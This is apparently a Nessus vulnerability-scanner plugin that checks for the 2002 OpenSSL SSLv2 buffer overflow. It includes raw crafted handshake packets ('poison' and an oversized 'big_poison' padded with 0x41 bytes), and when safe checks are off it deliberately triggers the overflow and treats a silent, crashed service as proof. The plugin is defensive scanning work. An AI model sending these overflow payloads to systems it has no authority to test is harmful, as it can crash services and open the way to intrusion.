#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>.
#
# Thanks to Solar Eclipse <solareclipse@phreedom.org>, who did most
# of the work.
#
# Will incidentally cover CVE-2001-1141 and CVE-2000-0535 
#  
#

if(description)
{
 script_id(11060);
 script_bugtraq_id(3004, 4316, 5363);
 script_cve_id("CVE-2002-0656", "CVE-2002-0655", "CVE-2002-0657", "CVE-2002-0659", "CVE-2001-1141");
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2002-a-0004");
 if( defined_func("script_xref") ) script_xref(name:"SuSE", value:"SUSE-SA:2002:033");

 script_version("$Revision: 1.28 $");
 
 name["english"] = "OpenSSL overflow (generic test)";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote service uses a library which is vulnerable to a buffer overflow
vulnerability.

Description :

The remote service seems to be using a version of OpenSSL which is
older than 0.9.6e or 0.9.7-beta3.

This version is vulnerable to a buffer overflow which, may allow an 
attacker to execute arbitrary commands on the remote host with the
privileges of the application itself.


Solution : 

Upgrade to OpenSSL version 0.9.6e (0.9.7beta3) or newer :
http://www.openssl.org

If the remote service is Compaq Insight Manager, please visit
http://h18023.www1.hp.com/support/files/server/us/download/15803.html

Risk factor :

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the behavior of OpenSSL";
 summary["francais"] = "V?rifie le comportement d'OpenSSL";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Solar Eclipse / Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Solar Eclipse / Renaud Deraison");
 family["english"] = "Gain a shell remotely";
 family["francais"] = "Obtenir un shell ? distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 
 exit(0);
}

include("global_settings.inc");

if ( safe_checks() && paranoia_level < 2 ) exit(0);

#------------------------------ Consts ----------------------#
client_hello = raw_string(
0x80, 0x31, 0x01, 0x00, 
0x02,  0x00, 0x18,0x00, 
0x00,  0x00, 0x10,0x07, 
0x00, 0xC0, 0x05, 0x00, 
0x80, 0x03, 0x00, 0x80, 
0x01, 0x00, 0x80, 0x08, 
0x00, 0x80, 0x06, 0x00, 
0x40, 0x04, 0x00, 0x80, 
0x02, 0x00, 0x80, 0xE4, 
0xBD, 0x00, 0x00, 0xA4, 
0x41, 0xB6, 0x74, 0x71, 
0x2B, 0x27, 0x95, 0x44, 
0xC0, 0x3D, 0xC0);

			
poison = raw_string(
0x80,0x5a,0x2,0x7,
0x0,0xc0,0x0,0x0,
0x0,0x40,0x0,0x10,
0x19,0x53,0xf,0x55,
0x5e,0xaa,0x68,0x71,
0x3,0x27,0x4,0x5a,
0x1f,0x5,0xea,0x33,
0x29,0x5b,0xb9,0x3f,
0x7d,0x28,0xe6,0x4c,
0xd4,0xb3,0x8e,0x36,
0x44,0xb5,0x86,0x6c,
0x6c,0x6,0xc1,0x5c,
0x45,0x73,0xb8,0x11,
0x55,0x23,0x3e,0x2a,
0x52,0xe0,0x52,0x30,
0xda,0xf8,0xee,0x15,
0x79,0xe1,0x3c,0x68,
0x36,0xd1,0x14,0x26,
0xae,0xd4,0x30,0x2,
0x0,0x0,0x0,0x0,
0x4,0x0,0x0,0x0,
0x41,0x41,0x41,0x41,
0x41,0x41,0x41,0x41);


big_poison = raw_string(
0x81, 0xca, 0x2, 0x7, 
0x0, 0xc0, 0x0, 0x0, 
0x0, 0x40, 0x1, 0x80, 
0xa4, 0x20, 0xb4, 0x44, 
0xd, 0xe, 0x7c, 0x5, 
0xc2, 0x21, 0x28, 0x4d, 
0xd3, 0xab, 0x6b, 0x72, 
0x10, 0xa3, 0x64, 0x7e, 
0x9, 0x7e, 0xe8, 0x28, 
0xe, 0x98, 0x5a, 0x5, 
0x2f, 0x32, 0xbb, 0xa, 
0x3c, 0xe0, 0x58, 0x5a, 
0xc5, 0xf1, 0x91, 0x36, 
0x1a, 0x27, 0x2c, 0x37, 
0x4b, 0xc2, 0xd2, 0x49, 
0x28, 0xc4, 0xf1, 0x76, 
0x41, 0xe5, 0xa4, 0x2d, 
0xe6, 0x9a, 0x55, 0x7e, 
0x27, 0x38, 0x89, 0x13, 
0x0, 0x0, 0x0, 0x0, 
0x4, 0x0, 0x0, 0x0, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41);



#-------- The code. We need the check what happens on each port ------------#

moderate_report = "

The remote host seems to be using a version of OpenSSL which is
older than 0.9.6e or 0.9.7-beta3

This version is vulnerable to a buffer overflow which,
may allow an attacker to obtain a shell on this host.

*** Note that since safe checks are enabled, this check 
*** might be fooled by non-openssl implementations and
*** produce a false positive.
*** In doubt, re-execute the scan without the safe checks


Solution : Upgrade to version 0.9.6e (0.9.7beta3) or newer
Risk factor : High";




port = get_kb_item("Transport/SSL");
if(!port) port = 443;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port, transport:ENCAPS_IP);
if(!soc)exit(0);
send(socket:soc, data:client_hello);
buf = recv(socket:soc, length:8192); 
if(!strlen(buf))exit(0);
send(socket:soc, data:poison);
buf = recv(socket:soc, length:10);
close(soc);
if(safe_checks())
{
if(strlen(buf) > 5)security_hole(port:port, data:moderate_report);
}
else
{
 if(strlen(buf) > 5)
 {
  soc = open_sock_tcp(port, transport:ENCAPS_IP);
  if(!soc)exit(0);
  send(socket:soc, data:client_hello);
  buf = recv(socket:soc, length:8192);
  if(!strlen(buf))exit(0);
  n = send(socket:soc, data:big_poison);
  if ( n != strlen(big_poison) ) exit(0);

  buf = recv(socket:soc, length:4096);
  close(soc);
  if(strlen(buf) == 0)security_hole(port);
 }
}


